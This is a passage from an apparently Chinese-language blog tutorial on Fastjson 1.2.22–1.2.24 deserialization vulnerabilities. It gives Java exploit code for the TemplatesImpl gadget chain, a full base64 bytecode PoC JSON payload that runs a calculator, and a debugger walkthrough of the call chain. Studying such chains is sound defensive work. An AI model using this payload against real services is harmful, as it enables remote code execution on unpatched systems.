+<p><strong>那么如何才能触发反序列化得到的危险操作类中的危险函数呢？</strong></p>
+<p>从前文可知，Fastjson在反序列化时，可能会将目标类的构造函数、<code>getter</code>方法、<code>setter</code>方法、<code>is</code>方法执行一遍，如果此时这四个方法中有危险操作，就会导致反序列化漏洞。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、<code>getter</code>方法、<code>setter</code>方法、<code>is</code>方法中要存在漏洞才能触发。</p>
+<p>举个例子：</p>
+<p>我们在setName()函数中加入了一个危险操作：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+<span class="token comment">//    private String name;</span>
+    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token comment">/*    public void setAge(int age) {
+        System.out.println("Student setAge");
+        this.age = age;
+    }*/</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后反序列化，便可弹出计算器</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
+<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175346825.png"></p>
+<p>上述就是反序列化具体类的场景，若是反序列化一个大类（抽象类）如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">Object obj04 = JSON.parseObject(jsonString, Object.class, Feature.SupportNonPublicField);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>小结一下，关键是要找出一个在目标环境中已存在的类，满足如下两个条件：</p>
+<ol>
+<li>该类的构造函数、<code>setter</code>方法、<code>getter</code>方法、<code>is</code>方法中的某一个存在危险操作；</li>
+<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
+</ol>
+<h2 id="反序列化漏洞（一）——1-2-22-1-2-24"><a href="#反序列化漏洞（一）——1-2-22-1-2-24" class="headerlink" title="反序列化漏洞（一）——1.2.22-1.2.24"></a>反序列化漏洞（一）——1.2.22-1.2.24</h2><h3 id="基于TemplatesImpl的利用链"><a href="#基于TemplatesImpl的利用链" class="headerlink" title="基于TemplatesImpl的利用链"></a>基于<code>TemplatesImpl</code>的利用链</h3><h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><p>需要设置<code>Feature.SupportNonPublicField</code>进行反序列化操作才能成功触发利用。</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>笔者复现用到的jar包：fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar</p>
+<p>在刚才的项目中，新建一个含有危险操作（弹计算器）的类<code>EvilClass.java</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">EvilClass</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后新建一个利用代码<code>TemplatesImpl_Exp.java</code>，作为漏洞入口，其中27行<code>readClass()</code>方法用于读取<code>EvilClass.class</code>文件，并进行base64编码。由于反序列化中<code>_bytecodes</code>、<code>_tfactory</code>等都是私有属性，因此<code>parseObject()</code>需要参数<code>Feature.SupportNonPublicField</code>。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOUtils</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImpl_Exp</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">final</span> <span class="token class-name">String</span> evilClassPath <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"file.separator"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"target/classes/TemplatesImpl_Exploit/EvilClass.class"</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token function">readClass</span><span class="token punctuation">(</span>evilClassPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">final</span> <span class="token class-name">String</span> NASTY_CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> text1 <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> NASTY_CLASS <span class="token operator">+</span>
+                    <span class="token string">"\",\"_bytecodes\":[\""</span><span class="token operator">+</span>evilCode<span class="token operator">+</span><span class="token string">"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },"</span> <span class="token operator">+</span>
+                    <span class="token string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n"</span><span class="token punctuation">;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出的POC：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADMAMgoABwAkCgAlACYIACcKACUAKAcAKQoABQAkBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzczsBAApFeGNlcHRpb25zBwArAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcALQwALgAvAQAEY2FsYwwAMAAxAQAfVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABUADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABgACAAZAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABABAAAQAiAAAAAgAj"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>'_name'<span class="token operator">:</span>'a.b'<span class="token punctuation">,</span>'_tfactory'<span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token property">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token property">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>关键点解释：</p>
+<ul>
+<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>是那个带有危险操作的类；</li>
+<li>经过base64编码的payload会经过私有属性<code>_bytecodes</code>传递给<code>_outputProperties</code>函数，从而导致命令执行；</li>
+<li>另外，在<code>defineTransletClasses()</code>时会调用<code>getExternalExtensionsMap()</code>，当为null时会报错，所以要对<code>_tfactory</code>设置，这一点后面调试分析会说到。</li>
+</ul>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175654367.png"></p>
+<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>以终为始，断点下在<code>EvilClass.java</code>的危险操作代码行</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175826238.png" style="zoom:80%;">
+
+<p>完整调用链如下图</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175954700.png" style="zoom:90%;">
+
+<p>为了调试分析，在入口<code>JSON.parseObject()</code>下个断点，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180157152.png"></p>
+<p>然后到<code>DefaultJSONParser</code>对象的<code>parseObject()</code>方法，继续进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180415783.png"></p>
+<p>接着调用了<code>ObjectDeserializer</code>的<code>deserialze()</code>方法，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180611353.png"></p>
+<p>然后判断调用<code>DefaultJSONParser</code>的<code>parseObject()</code>方法还是<code>parse()</code>方法，最终调用<code>DefaultJSONParser.parse()</code>方法</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180822913.png"></p>
+<p>在<code>DefaultJSONParser.parse()</code>里对JSON内容进行扫描，在switch语句中匹配上了<code>{</code>即对应12，调用<code>DefaultJSONParser.parseObject()</code>进行解析，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181152169.png"></p>
+<p>接着就是在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>里循环解析json中的内容，其中<code>skipWhitespace()</code>函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用<code>scanSymbol()</code>获取双引号内的内容，这里得到第一个双引号里的内容为<code>@type</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181334866.png"></p>
+<p>往下调试，判断key是否为<code>@type</code>且是否关闭了<code>Feature.DisableSpecialKeyDetect</code>设置，通过判断后调用<code>scanSymbol()</code>获取到了<code>@type</code>对应的指定类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl并调用<code>TypeUtils.loadClass()</code>函数加载该类，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181515630.png"></p>
+<p>看到红框的两个判断语句代码逻辑，是判断当前类名是否<strong>以<code>[</code>开头</strong>或<strong>以<code>L</code>开头以<code>;</code>结尾</strong>，当然本次调试分析是不会进入到这两个逻辑，但是<strong>这两个判断逻辑为后面的补丁绕过提供了思路</strong>，值得注意。</p>
+<p>接着通过<code>classLoader.loadClass()</code>加载到目标类后，将该类名和类缓存到Map中，最后返回该加载的类。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181741056.png"></p>
+<p>返回后继续接着<code>TypeUtils.loadClass()</code>往下执行，然后调用<code>deserializer.deserialze()</code>对<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>进行反序列化，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181901649.png"></p>
+<p>执行来到for循环，循环扫描解析</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182150090.png"></p>
+<p><code>fieldIndex</code>值为3时，会调用<code>parseField()</code>继续执行，此时解析到 key 值为<code>_bytecodes</code>，进入<code>parseField()</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182437049.png"></p>
+<p>会调用<code>fieldDeserializer.parseField()</code>对<code>_bytecodes</code>的值进一步解析，进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182639502.png"></p>
+<p>接着，会解析出<code>_bytecodes</code>对应的内容，然后调用<code>setValue()</code>函数设置对应的值，这里value即为恶意类二进制内容Base64解码后的数据，解码过程发生在<code>setValue()</code>前面的<code>fieldValueDeserilizer.deserialze()</code>函数。因为有解码，所以在构造POC的时候，我们也进行了Base64编码。进入<code>setValue()</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182850116.png"></p>
+<p>进入后可以看到，调用了<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的<code>set()</code>方法来设置<code>_bytecodes</code>的值：</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182952042.png"></p>
+<p>然后回到for循环遍历JSON数据中的其它键值对并赋值，下面是<code>_name</code>赋值</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183154373.png"></p>
+<p>给<code>_tfactory</code>赋值</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183306826.png"></p>
